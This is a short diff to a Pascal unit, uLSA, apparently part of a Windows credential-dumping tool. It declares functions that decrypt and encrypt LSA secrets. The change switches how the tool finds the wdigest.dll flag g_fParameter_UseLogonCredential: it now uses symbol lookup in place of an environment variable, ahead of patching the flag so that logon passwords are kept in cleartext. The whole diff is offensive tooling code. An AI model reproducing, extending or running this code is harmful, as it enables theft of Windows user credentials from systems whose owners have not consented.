@@ -5,7 +5,8 @@ unit uLSA;
 interface
 
 uses
-  windows,Classes, SysUtils,ucryptoapi,utils,upsapi,umemory,dos;
+  windows,Classes, SysUtils,dos,
+  ucryptoapi,utils,upsapi,umemory,udebug;
 
 function decryptLSA(cbmemory:ulong;encrypted:array of byte;var decrypted:tbytes):boolean;
 function encryptLSA(cbmemory:ulong;decrypted:array of byte;var encrypted:tbytes):boolean;
@@ -927,11 +928,23 @@ result:=false;
      end; //if (lowercase(osarch)='amd64') then
 
 
-  if lowercase(getenv('g_fParameter_UseLogonCredential'))<>'' then
+  //if lowercase(getenv('g_fParameter_UseLogonCredential'))<>'' then
+  if symmode=true then
      begin
-     patch_pos:=-1;
-     offset:=int64(strtoint('$'+getenv('g_fParameter_UseLogonCredential')));
-     log('env g_fParameter_UseLogonCredential:'+inttohex(offset,sizeof(offset)));
+     //patch_pos:=-1;
+     //offset:=int64(strtoint('$'+getenv('g_fParameter_UseLogonCredential')));
+     //log('env g_fParameter_UseLogonCredential:'+inttohex(offset,sizeof(offset)));
+     try
+     if _SymFromName (strpas(sysdir)+'\wdigest.dll','g_fParameter_UseLogonCredential',offset)
+        then
+           begin
+           log('_SymFromName:'+inttohex(offset,sizeof(offset)));
+           patch_pos:=-1;
+           end
+        else log('_SymFromName:failed');
+     except
+     on e:exception do log(e.Message );
+     end;
      end;
 
   if patch_pos =0 then
